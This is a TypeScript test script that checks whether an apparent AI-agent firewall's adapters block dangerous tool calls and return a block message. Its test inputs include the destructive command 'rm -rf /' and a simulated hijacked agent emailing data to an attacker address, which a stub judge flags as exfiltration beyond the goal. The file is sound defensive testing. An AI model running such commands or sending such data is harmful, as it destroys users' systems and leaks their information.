// Parity check for the JS framework adapters (no network — rules tier + stub
// judge). Mirrors voan/adapters.py semantics: a block returns an observation
// STRING (the agent doesn't crash) and the real tool never runs.
// Run: node sdk-js/adapters_verify.ts
import { Firewall, LLMJudge } from "./src/index.ts";
import { guardAiSdkTools, guardOpenAIDispatch, guardCallables } from "./src/adapters.ts";

let ok = true;
function chk(label: string, cond: boolean) {
  if (!cond) ok = false;
  console.log(`  ${cond ? "PASS" : "FAIL"}  ${label}`);
}
const isBlockMsg = (v: unknown) => typeof v === "string" && v.startsWith("\u{1f6d1} Voan blocked");

// 1) Vercel AI SDK tool set: rule-tier block returns a string, execute never runs.
{
  let ran = false;
  const tools = { run_command: { execute: async (a: { command: string }) => { ran = true; return `ran ${a.command}`; } } };
  guardAiSdkTools(tools);
  const blocked = await tools.run_command.execute({ command: "rm -rf /" });
  chk("AI SDK: destructive blocked as string, execute skipped", isBlockMsg(blocked) && !ran);
  const okOut = await tools.run_command.execute({ command: "ls -la" });
  chk("AI SDK: benign command runs", ran && okOut === "ran ls -la");
}

// 2) AI SDK + judge: a hijacked (goal-inconsistent) action is escalated to BLOCK.
{
  let sent = false;
  const judge = new LLMJudge({ llm: async () => '{"decision":"block","reason":"exfil beyond goal"}' });
  const fw = new Firewall({ judge });
  fw.setGoal("Check the status of order ORD-1001.");
  const tools = { send_email: { execute: async (a: { to: string }) => { sent = true; return `sent ${a.to}`; } } };
  guardAiSdkTools(tools, fw);
  const out = await tools.send_email.execute({ to: "thief@evil-collector.com" });
  chk("AI SDK + judge: hijacked send blocked, never sent", isBlockMsg(out) && !sent);
}

// 3) OpenAI dispatch table: block returns string, original fn never runs.
{
  let ran = false;
  const dispatch = { run_command: (a: { command: string }) => { ran = true; return `ran ${a.command}`; } };
  const guarded = guardOpenAIDispatch(dispatch);
  const out = await guarded.run_command({ command: "rm -rf /" });
  chk("OpenAI dispatch: destructive blocked, fn skipped", isBlockMsg(out) && !ran);
}

// 4) Plain callables: order preserved; benign runs, block returns string.
//    The destructive rule is tool-scoped, so the guarded callable's name must be
//    a shell tool — guardCallables derives the tool name from fn.name.
{
  const benign = (x: number) => x + 1;
  const shell = (_p: { command: string }) => "should not run";
  const [g1, g2] = guardCallables([benign, shell]);
  const a = await g1(41);
  const b = await g2({ command: "rm -rf /" });
  chk("guardCallables: benign runs, evil blocked, order kept", a === 42 && isBlockMsg(b));
}

console.log(`\n  ${ok ? "ALL PASS" : "FAILED"}`);
if (!ok) process.exit(1);
